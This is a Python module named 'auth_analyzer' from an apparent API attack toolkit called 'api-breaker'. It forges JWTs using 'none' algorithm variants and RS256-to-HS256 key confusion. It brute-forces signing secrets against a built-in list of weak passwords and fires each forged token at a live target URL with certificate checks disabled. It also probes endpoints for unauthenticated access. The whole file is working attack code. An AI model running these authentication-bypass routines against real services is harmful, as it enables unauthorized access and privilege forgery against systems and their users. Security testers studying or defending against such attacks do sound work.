#!/usr/bin/env python3
"""
Authentication Analyzer Module - api-breaker
Analyzes and tests API authentication mechanisms including JWT attacks.
Author: orizon.one
"""

import argparse
import base64
import hashlib
import hmac
import json
import ssl
import time
import urllib.request
import urllib.parse
from datetime import datetime


def log(msg):
    print(f"[*] {msg}")


def success(msg):
    print(f"[+] {msg}")


def warn(msg):
    print(f"[!] {msg}")


def vuln(msg):
    print(f"[VULN] {msg}")


def http_request(url, method="GET", headers=None, data=None, timeout=8):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    default_headers = {
        "User-Agent": "Mozilla/5.0 (compatible; orizon-hunter/1.0)",
        "Accept": "application/json, text/html, */*",
    }
    if headers:
        default_headers.update(headers)
    if data and isinstance(data, str):
        data = data.encode("utf-8")
    req = urllib.request.Request(url, data=data, headers=default_headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            body = resp.read(65536).decode("utf-8", errors="replace")
            return resp.status, dict(resp.headers), body
    except urllib.error.HTTPError as e:
        body = e.read(32768).decode("utf-8", errors="replace") if hasattr(e, "read") else ""
        return e.code, dict(e.headers) if hasattr(e, "headers") else {}, body
    except Exception:
        return 0, {}, ""


# Common weak JWT secrets for brute-force
WEAK_SECRETS = [
    "secret", "password", "123456", "key", "private", "public",
    "jwt_secret", "token", "auth", "admin", "test", "default",
    "changeme", "supersecret", "mysecret", "s3cr3t", "jwt",
    "hmac", "signing_key", "app_secret", "api_secret", "secretkey",
    "secret_key", "jwt-secret", "jwt_secret_key", "HS256",
    "qwerty", "abc123", "letmein", "welcome", "monkey",
    "master", "dragon", "login", "princess", "football",
    "shadow", "sunshine", "trustno1", "iloveyou", "1234567890",
    "", "null", "none", "undefined", "true", "false",
]


def b64url_encode(data):
    """Base64url encode without padding."""
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")


def b64url_decode(data):
    """Base64url decode with padding fix."""
    if isinstance(data, str):
        data = data.encode("utf-8")
    padding = 4 - len(data) % 4
    if padding != 4:
        data += b"=" * padding
    return base64.urlsafe_b64decode(data)


def decode_jwt(token):
    """Decode a JWT token without verification."""
    parts = token.split(".")
    if len(parts) != 3:
        return None

    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return {
            "header": header,
            "payload": payload,
            "signature": parts[2],
            "raw_parts": parts,
        }
    except Exception:
        return None


def forge_jwt_none(payload, header_extra=None):
    """Forge a JWT with algorithm=none."""
    header = {"alg": "none", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)

    h = b64url_encode(json.dumps(header))
    p = b64url_encode(json.dumps(payload))
    return f"{h}.{p}."


def forge_jwt_hs256(payload, secret, header_extra=None):
    """Forge a JWT with HS256."""
    header = {"alg": "HS256", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)

    h = b64url_encode(json.dumps(header))
    p = b64url_encode(json.dumps(payload))
    signing_input = f"{h}.{p}"
    sig = hmac.new(
        secret.encode("utf-8") if isinstance(secret, str) else secret,
        signing_input.encode("utf-8"),
        hashlib.sha256,
    ).digest()
    s = b64url_encode(sig)
    return f"{h}.{p}.{s}"


def test_jwt_none_bypass(decoded_jwt, test_url, extra_headers=None, delay=0):
    """Test JWT none algorithm bypass."""
    log("Testing JWT 'none' algorithm bypass...")
    findings = []

    payload = decoded_jwt["payload"]
    for alg_name in ["none", "None", "NONE", "nOnE"]:
        forged = forge_jwt_none(payload, {"alg": alg_name})
        headers = {"Authorization": f"Bearer {forged}"}
        if extra_headers:
            headers.update(extra_headers)
            headers["Authorization"] = f"Bearer {forged}"

        status, _, body = http_request(test_url, headers=headers)
        if delay:
            time.sleep(delay)

        if status in (200, 201):
            vuln(f"JWT 'none' algorithm bypass works with alg={alg_name}")
            findings.append({
                "type": "jwt_none_bypass",
                "severity": "critical",
                "algorithm_used": alg_name,
                "forged_token": forged[:50] + "...",
                "response_status": status,
            })
            break

    return findings


def test_jwt_hs256_confusion(decoded_jwt, test_url, extra_headers=None, delay=0):
    """Test RS256 to HS256 key confusion attack."""
    log("Testing RS256->HS256 key confusion...")
    findings = []

    original_alg = decoded_jwt["header"].get("alg", "")
    if original_alg not in ("RS256", "RS384", "RS512"):
        log(f"Original algorithm is {original_alg}, skipping key confusion test")
        return findings

    # In a real attack, we'd need the public key. Test with empty/common keys.
    test_keys = ["", "public_key", "-----BEGIN PUBLIC KEY-----"]
    payload = decoded_jwt["payload"]

    for key in test_keys:
        forged = forge_jwt_hs256(payload, key)
        headers = {"Authorization": f"Bearer {forged}"}
        if extra_headers:
            headers.update(extra_headers)
            headers["Authorization"] = f"Bearer {forged}"

        status, _, body = http_request(test_url, headers=headers)
        if delay:
            time.sleep(delay)

        if status in (200, 201):
            vuln("RS256->HS256 key confusion attack successful!")
            findings.append({
                "type": "jwt_key_confusion",
                "severity": "critical",
                "original_alg": original_alg,
                "attack_alg": "HS256",
                "key_used": key[:20] if key else "(empty)",
                "response_status": status,
            })
            break

    return findings


def brute_force_jwt_secret(decoded_jwt, test_url, extra_headers=None, delay=0):
    """Brute-force weak JWT secrets."""
    log(f"Brute-forcing JWT secret ({len(WEAK_SECRETS)} candidates)...")
    findings = []

    payload = decoded_jwt["payload"]

    for secret in WEAK_SECRETS:
        forged = forge_jwt_hs256(payload, secret)
        headers = {"Authorization": f"Bearer {forged}"}
        if extra_headers:
            headers.update(extra_headers)
            headers["Authorization"] = f"Bearer {forged}"

        status, _, body = http_request(test_url, headers=headers)
        if delay:
            time.sleep(delay)

        if status in (200, 201):
            vuln(f"JWT weak secret found: '{secret}'")
            findings.append({
                "type": "jwt_weak_secret",
                "severity": "critical",
                "secret": secret,
                "forged_token": forged[:50] + "...",
                "response_status": status,
            })
            break

    return findings


def test_api_key_positions(base_url, api_key, endpoints=None, delay=0):
    """Test API key in different positions."""
    log("Testing API key in various positions...")
    findings = []

    test_urls = endpoints or [base_url]
    positions = [
        ("header_authorization", {"Authorization": f"Bearer {api_key}"}),
        ("header_x_api_key", {"X-API-Key": api_key}),
        ("header_api_key", {"Api-Key": api_key}),
        ("header_x_auth_token", {"X-Auth-Token": api_key}),
    ]

    query_positions = [
        ("query_api_key", "api_key"),
        ("query_apikey", "apikey"),
        ("query_key", "key"),
        ("query_token", "token"),
        ("query_access_token", "access_token"),
    ]

    for url in test_urls[:5]:
        for pos_name, headers in positions:
            status, _, body = http_request(url, headers=headers)
            if delay:
                time.sleep(delay)
            if status in (200, 201):
                success(f"API key accepted at {pos_name} for {url}")
                findings.append({
                    "type": "api_key_position",
                    "position": pos_name,
                    "url": url,
                    "status": status,
                })

        for pos_name, param in query_positions:
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{param}={api_key}"
            status, _, body = http_request(test_url)
            if delay:
                time.sleep(delay)
            if status in (200, 201):
                success(f"API key accepted at {pos_name} for {url}")
                findings.append({
                    "type": "api_key_position",
                    "position": pos_name,
                    "url": url,
                    "status": status,
                })

    return findings


def test_no_auth_access(base_url, endpoints, delay=0):
    """Test endpoints accessible without authentication."""
    log("Testing for endpoints accessible without authentication...")
    findings = []

    for ep in endpoints:
        url = ep if isinstance(ep, str) else ep.get("url", "")
        if not url:
            continue
        if not url.startswith("http"):
            url = urllib.parse.urljoin(base_url, url)

        status, _, body = http_request(url)
        if delay:
            time.sleep(delay)

        if status in (200, 201):
            # Check if there's actual data
            has_data = len(body) > 50
            if has_data:
                vuln(f"No auth required: {url} (status={status}, len={len(body)})")
                findings.append({
                    "type": "no_auth_required",
                    "severity": "high",
                    "url": url,
                    "status": status,
                    "response_length": len(body),
                    "response_preview": body[:200],
                })

    return findings


def analyze_jwt_claims(decoded_jwt):
    """Analyze JWT claims for security issues."""
    findings = []
    payload = decoded_jwt["payload"]
    header = decoded_jwt["header"]

    # Check algorithm
    alg = header.get("alg", "")
    if alg == "none":
        vuln("JWT uses 'none' algorithm!")
        findings.append({"type": "jwt_none_alg", "severity": "critical"})
    elif alg in ("HS256", "HS384", "HS512"):
        warn(f"JWT uses symmetric algorithm: {alg}")
        findings.append({
            "type": "jwt_symmetric_alg",
            "severity": "medium",
            "algorithm": alg,
        })

    # Check expiration
    exp = payload.get("exp")
    if exp is None:
        vuln("JWT has no expiration claim!")
        findings.append({"type": "jwt_no_expiry", "severity": "high"})
    elif isinstance(exp, (int, float)):
        exp_dt = datetime.utcfromtimestamp(exp)
        now = datetime.utcnow()
        if exp_dt < now:
            warn(f"JWT is expired (exp: {exp_dt.isoformat()})")
        else:
            diff = exp_dt - now
            if diff.days > 30:
                warn(f"JWT has very long expiry: {diff.days} days")
                findings.append({
                    "type": "jwt_long_expiry",
                    "severity": "low",
                    "expiry_days": diff.days,
                })

    # Check for sensitive data in payload
    sensitive_keys = ["password", "passwd", "secret", "credit_card", "ssn", "cc_number"]
    for key in sensitive_keys:
        if key in payload:
            vuln(f"JWT contains sensitive field: {key}")
            findings.append({
                "type": "jwt_sensitive_data",
                "severity": "high",
                "field": key,
            })

    # Check for privilege-related claims
    privilege_claims = {}
    for key in ["role", "roles", "admin", "is_admin", "isAdmin", "permissions",
                 "scope", "scopes", "groups", "level", "privilege"]:
        if key in payload:
            privilege_claims[key] = payload[key]

    if privilege_claims:
        findings.append({
            "type": "jwt_privilege_claims",
            "severity": "info",
            "claims": privilege_claims,
        })

    return findings


def main():
    parser = argparse.ArgumentParser(description="Auth Analyzer - orizon.one")
    parser.add_argument("--input", "-i", help="Input JSON from api_discovery.py or schema_builder.py")
    parser.add_argument("--api-base", help="API base URL")
    parser.add_argument("--output", "-o", help="Output JSON file")
    parser.add_argument("--token", help="Auth token (JWT or API key) to analyze")
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--delay", type=float, default=0, help="Delay between requests (seconds)")
    args = parser.parse_args()

    if not args.token and not args.input:
        parser.error("Either --token or --input is required")

    extra_headers = {}
    if args.cookie:
        extra_headers["Cookie"] = args.cookie

    base_url = args.api_base or ""
    endpoints = []

    if args.input:
        log(f"Loading data from {args.input}")
        with open(args.input) as f:
            input_data = json.load(f)
        base_url = base_url or input_data.get("meta", {}).get("base_url", "")
        for api in input_data.get("discovered_apis", []):
            endpoints.append(api.get("url", ""))
        for ep in input_data.get("endpoints", []):
            endpoints.append(ep.get("url", ""))
        endpoints = [e for e in endpoints if e]

    if not base_url and endpoints:
        parsed = urllib.parse.urlparse(endpoints[0])
        base_url = f"{parsed.scheme}://{parsed.netloc}"

    log(f"Analyzing authentication for: {base_url}")

    all_findings = []

    # JWT Analysis
    jwt_info = None
    if args.token:
        decoded = decode_jwt(args.token)
        if decoded:
            success("Token identified as JWT")
            jwt_info = {
                "header": decoded["header"],
                "payload": decoded["payload"],
                "algorithm": decoded["header"].get("alg", "unknown"),
            }
            log(f"  Algorithm: {jwt_info['algorithm']}")
            log(f"  Claims: {list(decoded['payload'].keys())}")

            # Analyze claims
            claim_findings = analyze_jwt_claims(decoded)
            all_findings.extend(claim_findings)

            # Pick a test URL
            test_url = endpoints[0] if endpoints else base_url
            if test_url:
                # Test none algorithm bypass
                none_findings = test_jwt_none_bypass(decoded, test_url, extra_headers, args.delay)
                all_findings.extend(none_findings)

                # Test key confusion
                confusion_findings = test_jwt_hs256_confusion(decoded, test_url, extra_headers, args.delay)
                all_findings.extend(confusion_findings)

                # Brute-force weak secrets
                bf_findings = brute_force_jwt_secret(decoded, test_url, extra_headers, args.delay)
                all_findings.extend(bf_findings)
        else:
            log("Token does not appear to be JWT, testing as API key")
            if endpoints:
                key_findings = test_api_key_positions(base_url, args.token, endpoints[:10], args.delay)
                all_findings.extend(key_findings)

    # Test no-auth access
    if endpoints:
        noauth_findings = test_no_auth_access(base_url, endpoints[:30], args.delay)
        all_findings.extend(noauth_findings)

    # Categorize findings
    critical = [f for f in all_findings if f.get("severity") == "critical"]
    high = [f for f in all_findings if f.get("severity") == "high"]
    medium = [f for f in all_findings if f.get("severity") == "medium"]
    low = [f for f in all_findings if f.get("severity") in ("low", "info")]

    output = {
        "meta": {
            "base_url": base_url,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": "auth_analysis",
            "tool": "api-breaker by orizon.one",
        },
        "stats": {
            "total_findings": len(all_findings),
            "critical": len(critical),
            "high": len(high),
            "medium": len(medium),
            "low": len(low),
            "endpoints_tested": len(endpoints),
        },
        "jwt_info": jwt_info,
        "findings": all_findings,
    }

    domain = urllib.parse.urlparse(base_url).hostname or "unknown" if base_url else "unknown"
    output_path = args.output or f"auth_analysis_{domain.replace('.', '_')}.json"
    with open(output_path, "w") as f:
        json.dump(output, f, indent=2)
    success(f"Results saved to: {output_path}")

    print(f"\n{'='*60}")
    print(f"  AUTH ANALYSIS SUMMARY - {base_url}")
    print(f"{'='*60}")
    print(f"  JWT detected        : {'Yes' if jwt_info else 'No'}")
    if jwt_info:
        print(f"  JWT algorithm       : {jwt_info['algorithm']}")
    print(f"  Endpoints tested    : {len(endpoints)}")
    print(f"  Total findings      : {len(all_findings)}")
    print(f"  Critical            : {len(critical)}")
    print(f"  High                : {len(high)}")
    print(f"  Medium              : {len(medium)}")
    print(f"  Low/Info            : {len(low)}")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
